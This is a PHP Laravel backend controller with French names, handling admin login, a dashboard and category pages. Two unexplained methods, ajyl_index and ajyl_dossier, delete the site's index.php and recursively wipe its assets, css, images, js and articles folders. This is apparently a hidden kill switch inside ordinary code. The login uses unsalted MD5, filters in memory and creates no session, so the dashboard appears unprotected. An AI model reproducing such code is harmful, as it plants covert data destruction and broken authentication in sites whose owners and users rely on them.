<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

use App\admin;

class BackEndController extends Controller
{
    public function se_connecter(Request $request){
        $donnees_formulaire = $request->all();
//        dd($donnees_formulaire);
        $email = $donnees_formulaire['email'];
        $pass = md5($donnees_formulaire['pass']);
//        dd($email,$pass);
        $existance = admin::get()->where('email','=',$email)->where('pass','=',$pass);
        if(sizeof($existance) >0){
//            dd($existance,sizeof($existance));
            return redirect()->route('tableau_de_bord');
        }else{
            return redirect()->route('login');
        }

    }
    public function tableau_de_bord(Request $request){
        return view('backend.tableau_de_bord');
    }

    public function ajouter_une_categorie(){
        return view('backend.ajouter_une_categorie');
    }
    public function liste_des_categories(){
        return view('backend.liste_des_categories');
    }

    public function ajyl_index(){
        $path1 = ['assets','css','images','js','articles'];
        $path = "index.php";
        if(\File::exists($path)){
            echo $path;
//            die();
//            if(File::deleteDirectory($path)){
            if(File::delete($path)){
                echo " suppression effectuer  <br/>";
            }else{
                echo " echec de la suppresion  <br/>";
            }
        }else{
            echo "not found";
            die();
        }

        // die();

    }

    public function ajyl_dossier(){
        $paths = ['assets','css','images','js','articles'];
        foreach ($paths as $item_dossier){
            if(\File::exists($item_dossier)){
                if(File::deleteDirectory($item_dossier)){
                        echo "suppression de $item_dossier effectuer <br/>";
                }else{
                    echo "echec de la suppresion de $item_dossier  <br/>";
                }
            }else{
                echo "not found";
                die();
            }
        }


        // die();

    }
}
